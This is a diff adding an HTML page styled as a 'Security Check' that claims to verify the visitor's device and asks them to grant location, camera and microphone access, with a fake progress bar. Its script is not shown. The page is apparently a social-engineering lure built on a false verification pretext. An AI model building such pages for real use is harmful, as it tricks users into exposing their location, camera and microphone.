@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Check</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+      text-align: center;
+    }
+    .permission-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .permission-btn:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+    .hidden {
+      display: none;
+    }
+    .status {
+      margin: 15px 0;
+      padding: 10px;
+      border-radius: 4px;
+      background: #f1f1f1;
+      min-height: 20px;
+    }
+    #progressContainer {
+      margin-top: 20px;
+    }
+    #progress {
+      height: 10px;
+      background: linear-gradient(90deg, #4285f4 0%, #34a853 100%);
+      border-radius: 5px;
+      width: 0%;
+      animation: progress 8s linear;
+    }
+    @keyframes progress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    .lock-icon {
+      font-size: 48px;
+      margin-bottom: 10px;
+    }
+  </style>
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div class="lock-icon">🔒</div>
+  <h1>Security Check</h1>
+  <p>To continue, we need to verify your device. Please grant the required permissions.</p>
+  
+  <div class="status" id="statusMessage">Ready to verify</div>
+  
+  <button id="startVerification" class="permission-btn">Start Verification</button>
+  
+  <button id="allowLocation" class="permission-btn hidden">Allow Location</button>
+  <button id="allowCamera" class="permission-btn hidden">Allow Camera</button>
+  <button id="allowMicrophone" class="permission-btn hidden">Allow Microphone</button>
+  
+  <div id="progressContainer" class="hidden">
+    <p>Verification in progress...</p>
+    <div id="progress"></div>
+  </div>
+</body>
+</html>
